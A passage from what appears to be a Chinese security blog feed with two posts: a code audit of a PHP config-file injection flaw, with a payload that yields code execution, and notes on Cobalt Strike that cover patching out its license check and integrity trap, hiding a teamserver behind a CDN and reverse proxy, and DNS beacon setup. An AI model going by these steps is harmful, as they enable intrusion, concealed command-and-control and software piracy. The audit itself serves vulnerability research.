<p>今天奇安信ATEAM团队分享一篇深度好文<a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1583986259159&amp;sharer_shareid=d06f5100b74c6a6043a4856c598dbaf1&amp;key=c4230f1895226f443ac5ed8cb350a0fc09943a72ae98f844e97e9d175efc45e2e612404eb5968d0e94fe802eadeea197d1acce5a3db314fd109867ed3f5d6c4b752a7c87f9913a0c08fefddfd54e4318&amp;ascene=1&amp;uin=MjU3NjgxNzU1&amp;devicetype=Windows%2010&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=AfRrPn3JXWlZnvQ%2biRo3zxA=&amp;pass_ticket=ns/eKq2Uqjjp3o6u2MvyTvGHRbmsIi/EA16oNcNTRI8=">这是一篇“不一样”的真实渗透测试案例分析文章</a>引爆朋友圈多次转发分享，Phith0n 师傅也专门写了一篇<a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a>的总结，看了P神师傅文章想起我之前也挖到过一个类似漏洞，这里我把中间思路和部分代码贴出来分享一份。</p>
<h1 id="0x01-分析">0x01 分析</h1>
<p>漏洞代码还是出在一个写配置文件的函数当中，代码如下（大部分代码删去，只留核心部分）：</p>
<pre><code class="language-php">public function input($c)
    {
     ///...........省略大部分代码..........
            if ($_POST['name_list']) {
                $name_list = explode(&quot;/&quot;, $_POST['name_list']);
                foreach ($name_list as $v) {
                    if (substr($v, 0, 6) == &quot;_scfg_&quot;) {
                        $name = substr($v, 6);
                    } else {
                        $name = $v;
                    }
                    if ($name) {
                        { if (is_array($_POST[$v])) {
                            $input[$name] = implode(&quot;|@|&quot;, $_POST[$v]);
                        } else {
                            $input[$name] = $_POST[$v];
                        }}
                    }
                }
            }
            
            $filename = $newsid.&quot;.php&quot;;
            $res = write_config_file($this-&gt;lib_path.&quot;../data/&quot;.$dir.&quot;/&quot;, $filename, &quot;_scfg_var&quot;, $input, false, false);
            
            if ($all_input) {
                $is_one_fail = false;
                if ($ares = mysql_query(&quot;select * from &quot;.$this-&gt;table_name.&quot; where cate1='$vars[cate1]' and cate2='$vars[cate2]' and cate3 ='$vars[cate3]' and skin ='$vars[skin]' &quot;, $this-&gt;link_id)) {
                    while ($arow = mysql_fetch_assoc($ares)) {
                        if ($arow['id'] != $newid) {
                            $_scfg_var = array();
                            $filename = $arow['newsid'].&quot;.php&quot;;
                            @include($this-&gt;lib_path.&quot;../data/&quot;.$dir.&quot;/&quot;.$filename);
                            foreach ($_scfg_var as $k =&gt; $v) {
                                $_scfg_var[$k] = addslashes($v);
                            }
                          
                            }
                            $res = write_config_file($this-&gt;lib_path.&quot;../data/&quot;.$dir.&quot;/&quot;, $filename, &quot;_scfg_var&quot;, $_scfg_var, false, false);
                       ///...........省略大部分代码..........    
        return $newsid;
    }

</code></pre>
<p>这里通过POST获取name_list参数值，然后将值按“/” 分割存入数组<mark>input</mark>，然后将数组传输<code>write_config_file</code>函数，继续跟进<code>write_config_file</code></p>
<pre><code class="language-php">#! /lib/cfg/cfglib.php

function write_config_file($path, $file, $name, $input, $is_serial = true, $is_alert = true, $chmod = 0707)
{
	global $_NL;
	$conf_file = $path.$file;
	$tmp_file = ereg_replace(&quot;(\.[^.]+)$&quot;,&quot;_tmp\\1&quot;,$conf_file); 
	$tmp_file2 = ereg_replace(&quot;(\.[^.]+)$&quot;,&quot;_tmp_\\1&quot;,$conf_file); 
	$name = &quot;$&quot;.$name;
	if( !$is_serial )
	{
		$output =  &quot;&lt;?&quot;.$_NL;
		foreach($input as $key =&gt; $val )
		{
			$key = str_replace(&quot;'&quot;, '\'', $key);
			if( is_array( $val ) )
			{
				foreach($val as $key1 =&gt; $val1 )
				{
					$key1 = str_replace(&quot;'&quot;, '\'', $key1);
					$output .= $name.&quot;['&quot;.$key.&quot;']['&quot;.$key1.&quot;'] = '&quot;.str_replace('\&quot;', '&quot;', $val1).&quot;';&quot;.$_NL;;
					//$output .= $name.&quot;['&quot;.$key.&quot;']['&quot;.$key1.&quot;'] = \&quot;&quot;.str_replace(&quot;\'&quot;, &quot;'&quot;, $val1).&quot;\&quot;;&quot;.$_NL;
				}				
				
			}
			else $output .= $name.&quot;['&quot;.$key.&quot;'] = '&quot;.str_replace('\&quot;', '&quot;', $val).&quot;';&quot;.$_NL;;
			
		}
    	
		$output .=  &quot;?&gt;&quot;;
	}
	// ..................省略写文件部分代码................
	
}

</code></pre>
<p>这里<code>$key1 = str_replace(&quot;'&quot;, '\'', $key1);</code>程序员明明是想过滤掉写key值的，但是我估计转义符和单双引号已经把他搞糊涂了，这里这个转移根本就没起到作用。由此可见控制<code>input</code>即可控制写入文件的内容，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20200312230612242.png" alt="在这里插入图片描述" loading="lazy"><br>
但受到整体参数过滤影响，所有POST的单引号都会被转义为&quot;\’&quot;,一般情况下若提交单引号将会得到如下结果：<br>
<img src="https://img-blog.csdnimg.cn/20200312230637391.png" alt="在这里插入图片描述" loading="lazy"><br>
但在继续跟进<code>input</code>函数后半部分代码时候发现在<code>$all_input</code>为<code>true</code>的情况下，会从数据库中查询相同的内容，并定包含该文件，将<code>$_scfg_var</code>值从新写入到文件，代码如下：</p>
<pre><code class="language-php">if ($all_input) {
                $is_one_fail = false;
                if ($ares = mysql_query(&quot;select * from &quot;.$this-&gt;table_name.&quot; where cate1='$vars[cate1]' and cate2='$vars[cate2]' and cate3 ='$vars[cate3]' and skin ='$vars[skin]' &quot;, $this-&gt;link_id)) {
                    while ($arow = mysql_fetch_assoc($ares)) {
                        if ($arow['id'] != $newid) {
                            $_scfg_var = array();
                            $filename = $arow['newsid'].&quot;.php&quot;;
                            @include($this-&gt;lib_path.&quot;../data/&quot;.$dir.&quot;/&quot;.$filename);
                            foreach ($_scfg_var as $k =&gt; $v) {
                                $_scfg_var[$k] = addslashes($v);
                            }
                          
                            }
                            $res = write_config_file($this-&gt;lib_path.&quot;../data/&quot;.$dir.&quot;/&quot;, $filename, &quot;_scfg_var&quot;, $_scfg_var, false, false);
</code></pre>
<p>这里就必要有意思了，这了会<code>include</code>刚才写入的文件，然后将值取出再次写入。这里<code>$_scfg_var[$k] = addslashes($v);</code>程序员值对值进行<code>addslashes</code>操作，而键名为做任何处理，在include包含执行该文件后此处的<code>$_scfg_var[$k] = addslashes($v);</code>中的<code>$k</code>值就有了正常的单引号“’”了，后续再将<code>$_scfg_var</code>传入<code>write_config_file</code>中后单引号未得到过滤，最终写入文件后便成了如下：<br>
<img src="https://img-blog.csdnimg.cn/20200312231340198.png" alt="在这里插入图片描述" loading="lazy"></p>
<h1 id="0x02-利用">0x02 利用</h1>
<p>这里只需要向目标二次提交代码即可逃逸了，例如<code>target.php?name_list=testsssssss'];phpinfo();#/bbb&amp;test=testskin_file</code> 第一次提交代码被magic_gpc转义后写入文件，第二次提交时候因第一次生成了文件，所以这里程序逻辑条到后半部分，<code>include</code>第一次写入的文件，然后再将数组二次写，代码成功执行！</p>
<h1 id="0x03-结语">0x03 结语</h1>
<p>此文由大佬们的深度好文有感而发，有不到之处多指教。漏洞原理和成因也比较简单，但当时还是读了许久代码才发现问题，主要是代码写得太乱。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cobalt Strike折腾踩坑填坑记录]]></title>
        <id>https://ca3tie1.github.io/post/cobalt-strike-zhe-teng-cai-keng-tian-keng-ji-lu/</id>
        <link href="https://ca3tie1.github.io/post/cobalt-strike-zhe-teng-cai-keng-tian-keng-ji-lu/">
        </link>
        <updated>2020-03-21T16:59:51.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E8%83%8C%E6%99%AF">0X00 背景</a></li>
<li><a href="#0x01-%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86">0x01 基础原理</a></li>
<li><a href="#0x02-%E5%85%B3%E4%BA%8E%E7%A0%B4%E8%A7%A3">0x02 关于破解</a>
<ul>
<li><a href="#exit%E6%9A%97%E6%A1%A9">Exit暗桩</a></li>
</ul>
</li>
<li><a href="#0x03-cdn%E5%8F%8D%E4%BB%A3%E9%9A%90%E8%97%8Fteamserver">0x03 CDN+反代隐藏Teamserver</a>
<ul>
<li><a href="#domain-fronting">Domain Fronting</a></li>
<li><a href="#proxy">Proxy</a></li>
</ul>
</li>
<li><a href="#0x04-dns%E4%B8%8A%E7%BA%BF">0x04 DNS上线</a>
<ul>
<li><a href="#%E4%B8%80%E4%B8%AA%E6%9C%AA%E5%A1%AB%E7%9A%84%E5%9D%91">一个未填的坑</a></li>
<li><a href="#dns-listener%E7%89%B9%E6%80%A7">DNS Listener特性</a></li>
</ul>
</li>
<li><a href="#0x05-%E7%BB%93%E8%AF%AD">0x05 结语</a></li>
</ul>
</p>
<h1 id="0x00-背景">0X00 背景</h1>
<p>最近在做渗透测试相关的工作，因工作需要准备用Cobalt Strike，老早都知道这款神器，早几年也看过官方的视频教程，但英文水平太渣当时很多都没听懂，出于各种原因后来也没怎么深入了解，所以一直都是处在大概了解的层面上。直到现在有需求了才开始研究，过程中体会也是蛮深，技术这东西真的不能只停留在知道和了解这个层面，就像学一门语言一样需要多动手去实践才能熟练运用的。当然在深入研究某一门技术的过程中难免遇到各种各样的问题，一步一步解决这些问题才是真正学习的过程。对Cobalt strike的学习和研究中我也同样遇到很多的问题，辛得一些素不相识的师傅无私帮助，才解决掉所有的问题，这里把过程中一些问题和解决办法记录下来，以便以后查阅，同时也希望对刚接触Cobatl strike的朋友有所帮助。</p>
<h1 id="0x01-基础原理">0x01 基础原理</h1>
<p>基础使用和原理网上有大把的文章和教程，我这里只阐述我个人理解的几个基本点，先说<code>stage</code>和<code>stager</code>,在传统的远程控制类软件我们都是直接生成一个完整功能的客户端(其中包含了各种远控所需功能代码)，比如灰鸽子（...这里年龄已暴露。。)，然后将客户端以各种方式上传至目标机器然后运行，运行后目标机器与我们控制端点对点的通讯。而Cobalt strike把这部分拆解为两部(<code>stage</code>和<code>stager</code>)，<code>stager</code> 是一个小程序，通常是手工优化的汇编指令，用于下载 <code>stage</code>、把它注入内存中运行。<code>stage</code>则就是包含了很多功能的代码块，用于接受和执行我们控制端的任务并返回结果。<code>stager</code> 通过各种方式(如http、dns、tcp等)下载<code>stage</code>并注入内存运行这个过程称为<code>Payload Staging</code>。同样Cobalt strike也提供了类似传统远控上线的方式，把功能打包好直接运行后便可以与teamserver通讯，这个称为<code>Payload Stageless</code>，生成<code>Stageless</code>的客户端可以在 <code>Attack-&gt;Package-&gt;Windows Executeable（s）</code>下生成。这部分我也是在研究dns上线时候才算分清楚，这里需要感谢B0y1n4o4师傅的帮助</p>
<h1 id="0x02-关于破解">0x02 关于破解</h1>
<p>目前网上公布版本大多为官方试用版破解而来且最高版为3.14（5月4号）版，我托朋找了一份3.14官方原版的来，原版的本身没有试用版那么多限制，破解也相对容易，只需绕过license认证即可，这里在文件<code>common/Authorization.class</code>的构造函数中。</p>
<pre><code class="language-java">public Authorization() {
    String str = CommonUtils.canonicalize(&quot;cobaltstrike.auth&quot;);
    if (!(new File(str)).exists())
      try {
        File file = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        if (file.getName().toLowerCase().endsWith(&quot;.jar&quot;))
          file = file.getParentFile(); 
        str = (new File(file, &quot;cobaltstrike.auth&quot;)).getAbsolutePath();
      } catch (Exception exception) {
        MudgeSanity.logException(&quot;trouble locating auth file&quot;, exception, false);
      }  
    byte[] arrayOfByte1 = CommonUtils.readFile(str);
    if (arrayOfByte1.length == 0) {
      this.error = &quot;Could not read &quot; + str;
      return;
    } 
    AuthCrypto authCrypto = new AuthCrypto();
    byte[] arrayOfByte2 = authCrypto.decrypt(arrayOfByte1);
    if (arrayOfByte2.length == 0) {
      this.error = authCrypto.error();
      return;
    } 
    String[] arrayOfString = CommonUtils.toArray(CommonUtils.bString(arrayOfByte2));
    if (arrayOfString.length &lt; 4) {
      this.error = &quot;auth content is only &quot; + arrayOfString.length + &quot; items&quot;;
      return;
    } 
    this.licensekey = arrayOfString[0];
    if (&quot;forever&quot;.equals(arrayOfString[1])) {
      this.validto = arrayOfString[1];
      MudgeSanity.systemDetail(&quot;valid to&quot;, &quot;perpetual&quot;);
    } else {
      this.validto = &quot;20&quot; + arrayOfString[1];
      MudgeSanity.systemDetail(&quot;valid to&quot;, CommonUtils.formatDateAny(&quot;MMMMM d, YYYY&quot;, getExpirationDate()));
    } 
    this.watermark = CommonUtils.toNumber(arrayOfString[2], 0);
    this.valid = true;
    MudgeSanity.systemDetail(&quot;id&quot;, this.watermark + &quot;&quot;);
  }
</code></pre>
<p>这里需要把该类的<code>watermark</code>、<code>licensekey</code>、<code>validto</code>、<code>valid</code>实例域手动设置即可，如下面代码</p>
<pre><code class="language-java">  public Authorization() {
    this.valid = true;
    this.validto = &quot;forever&quot;;
    this.licensekey = &quot;Cartier&quot;;
    this.watermark = 1;
    MudgeSanity.systemDetail(&quot;valid to&quot;, &quot;perpetual&quot;);
    MudgeSanity.systemDetail(&quot;id&quot;, this.watermark + &quot;&quot;);
  }
</code></pre>
<p>剩余下其他关于listener个数限制可以参考<a href="https://www.cnblogs.com/ssooking/p/11045530.html">ssooking</a>师傅的博客查看。</p>
<h2 id="exit暗桩">Exit暗桩</h2>
<p>剩下的一个就是Cobalt strike作者留下的一个exit的暗桩问题，这里还是请教了ssooking师傅才知道，否则我这Java渣渣不知道要找到什么时候，这里再次对ssooking师傅的帮助表示感谢。<br>
作者在程序里留了个验证jar文件完整性的功能，如果更改了jar包的文件 这个完整性就遭到破坏，作者会在目标上线30分钟后，在此以后添加的命令任务后门加一个exit的指令，目标的beacon就自动断开了，如下图。<br>
<img src="https://img-blog.csdnimg.cn/20200310142833195.jpg" alt="在这里插入图片描述" loading="lazy"><br>
代码在<code>beacon/BeaconC2.class</code></p>
<pre><code class="language-java">  protected boolean isPaddingRequired() {
    boolean bool = false;
    try {
      ZipFile zipFile = new ZipFile(this.appd);
      Enumeration&lt;? extends ZipEntry&gt; enumeration = zipFile.entries();
      while (enumeration.hasMoreElements()) {
        ZipEntry zipEntry = enumeration.nextElement();
        long l1 = CommonUtils.checksum8(zipEntry.getName());
        long l2 = zipEntry.getName().length();
        if (l1 == 75L &amp;&amp; l2 == 21L) {
          if (zipEntry.getCrc() != 1661186542L &amp;&amp; zipEntry.getCrc() != 1309838793L)
            bool = true; 
          continue;
        } 
        if (l1 == 144L &amp;&amp; l2 == 20L) {
          if (zipEntry.getCrc() != 1701567278L &amp;&amp; zipEntry.getCrc() != 3030496089L)
            bool = true; 
          continue;
        } 
        if (l1 == 62L &amp;&amp; l2 == 26L &amp;&amp; zipEntry.getCrc() != 2913634760L &amp;&amp; zipEntry.getCrc() != 376142471L)
          bool = true; 
      } 
      zipFile.close();
    } catch (Throwable throwable) {}
    return bool;
  }
</code></pre>
<pre><code class="language-java">public BeaconC2(Profile paramProfile, BeaconData paramBeaconData, Resources paramResources) {
    this.c2profile = paramProfile;
    this.resources = paramResources;
    this.data = paramBeaconData;
    this.channel_http = new BeaconHTTP(paramProfile, this);
    this.channel_dns = new BeaconDNS(paramProfile, this);
    this.socks = new BeaconSocks(this);
    this.appd = getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
    paramBeaconData.shouldPad(isPaddingRequired());	//这里调用BeaconData类的shouldPad
    this.parsers.add(new MimikatzCredentials(paramResources));
    this.parsers.add(new MimikatzSamDump(paramResources));
    this.parsers.add(new DcSyncCredentials(paramResources));
    this.parsers.add(new MimikatzDcSyncCSV(paramResources));
    this.parsers.add(new ScanResults(paramResources));
    this.parsers.add(new NetViewResults(paramResources));
  }
</code></pre>
<p>再看beacon/BeaconData.class</p>
<pre><code class="language-java">  
  public void shouldPad(boolean paramBoolean) {
    this.shouldPad = paramBoolean;
    this.when = System.currentTimeMillis() + 1800000L;
  }
  
  public void task(String paramString, byte[] paramArrayOfbyte) {
    synchronized (this) {
      List&lt;byte[]&gt; list = getQueue(paramString);
      //这里判断文件完整性和beacon上线是否草果30分钟
      if (this.shouldPad &amp;&amp; System.currentTimeMillis() &gt; this.when) {
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(3);
        commandBuilder.addString(paramArrayOfbyte);
        list.add(commandBuilder.build());
      } else {
        list.add(paramArrayOfbyte);
      } 
      this.tasked.add(paramString);
    } 
  }
</code></pre>
<p>破解方法是直接更改<code>shouldPad</code>方法中的<code>this.shouldPad = paramBoolean;</code>为<code>this.shouldPad = false;</code></p>
<h1 id="0x03-cdn反代隐藏teamserver">0x03 CDN+反代隐藏Teamserver</h1>
<h2 id="domain-fronting">Domain Fronting</h2>
<p>这部分原理参考垃圾桶师傅的文章(<a href="https://xz.aliyun.com/t/4509">点这里</a>)，这里帮垃圾桶师傅填一个他在文章中说遇到的坑。<br>
<img src="https://img-blog.csdnimg.cn/20200310195328140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
<img src="https://img-blog.csdnimg.cn/20200310195341407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这里垃圾桶师傅在添加Listener的时候Host填写的是CDN的地址，在使用powershell下载<code>stager</code>运行，<code>stager</code>再去下载<code>stage</code>的时候就是直接访问cdn的地址下载，但是<code>malleable profile</code>没有配置制定stager的行为，所以无法正常回源到teamserver下载，这里只需要在profile文件中配置<code>http-stager</code>模块，像http-get一样指定好Host即可从CDN访问到teamserver下载<code>stage</code>了。</p>
<h2 id="proxy">Proxy</h2>
<p>反向代理原理这里借用垃圾桶师傅的图,我就不具体再阐述，垃圾桶师傅已经讲得很明白。<br>
<img src="https://img-blog.csdnimg.cn/20200310195453379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
我使用的是Nginx做的反向代理，这里如果刚研究这个的朋友可能会遇到客户端上线后IP是Nginx服务器IP，走CDN的时候显为CDN节点IP的情况，这里有两个解决办法，先看看<code>server/ServerUtils.class</code>类中代码：</p>
<pre><code class="language-java">  public static String getRemoteAddress(Profile paramProfile, Map paramMap) {
    boolean bool = paramProfile.option(&quot;.http-config.trust_x_forwarded_for&quot;);
    if (bool &amp;&amp; paramMap.containsKey(&quot;X-Forwarded-For&quot;)) {
      String str1 = (String)paramMap.get(&quot;X-Forwarded-For&quot;);
      if (str1.indexOf(&quot;,&quot;) &gt; -1) {
        str1 = CommonUtils.strrep(str1, &quot; &quot;, &quot;&quot;);
        StringStack stringStack = new StringStack(str1, &quot;,&quot;);
        str1 = stringStack.shift();
      } 
      if (CommonUtils.isIP(str1) || CommonUtils.isIPv6(str1))
        return str1; 
      CommonUtils.print_error(&quot;remote address '&quot; + (String)paramMap.get(&quot;X-Forwarded-For&quot;) + &quot;' in X-Forwarded-For header is not valid.&quot;);
    } 
    String str = (String)paramMap.get(&quot;REMOTE_ADDRESS&quot;);
    return &quot;&quot;.equals(str) ? &quot;&quot; : str.substring(1);
  }
}

</code></pre>
<p>这里Cobatl Strike可以从<code>HttpHeader</code>中的<code>REMOTE_ADDRESS</code>和<code>X-Forwarded-For</code>中取得IP，我们要么在Nginx反向代理的时候设置<code>REMOTE_ADDRESS</code>值，要么在profile的配置文件中的<code>http-config</code>模块设置<code>trust_x_forwarded_for</code>值为<code>true</code>，这也是看了代码从知道有这个配置，英文渣渣表示很惭愧，官方写得很详细。<br>
这里有个问题就是反向代理时候自定义<code>REMOTE_ADDRESS</code>时候往往无效，不知道具体啥情况，我之前在另外的机器上都有测试成功过。</p>
<h1 id="0x04-dns上线">0x04 DNS上线</h1>
<h2 id="一个未填的坑">一个未填的坑</h2>
<p>这个坑是研究和使用Cobalt Strike来最大一个坑，至发文今日都没有解决。问题是出在使用DNS的listener不管是<code>beacon_dns/reverse_http</code>还是<code>beacon_dns/reverse_dns_txt</code>时候，若使用<code>staging</code>方式<code>stager</code>在下载<code>stage</code>注入到内存中的时候崩掉，如下图。<br>
<img src="https://img-blog.csdnimg.cn/20200310155531296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
而若使用<code>beacon_dns/reverse_http</code>时候，选用非纯dns模式就没问题，非纯dns模式状态下stager在下载stage时候使用http方式，stage只要成功下载注入内存后便可以mode改用dns方式来通讯了，要是有师傅知道怎么回事还赐教。</p>
<h2 id="dns-listener特性">DNS Listener特性</h2>
<p>最后经B0y1n4o4师傅指点，改用stageless方式上线就没有问题了。但是在使用dns上线的时候还需要注意个问题。在添加Listener的时候<code>beacon_dns/reverse_http</code>和<code>beacon_dns/reverst_dns_txt</code>都需要填写端口信息，如下图。<br>
<img src="https://img-blog.csdnimg.cn/20200310161120815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
如果端口使用80的情况下，上线之后的通讯优先使用http方式，若想用纯dns通讯的话就需要在上线之后首先使用<code>mode</code> 指令切换至dns、dns-txt或者dns6模式。添加listener自定一个非80的端口上线之后所以的通讯都将默认采用dns方式，且不能使用mode切换成http模式。</p>
<h1 id="0x05-结语">0x05 结语</h1>
<p>以上均为我个人一些研究测试结论，有不到之处还请多多指正，Cobalt Strike确实是一个蛮强大的工具，还有很多内容和技术有待研究，本人也正在学习Java，争取早日通读内核代码。</p>
]]></content>
    </entry>
</feed>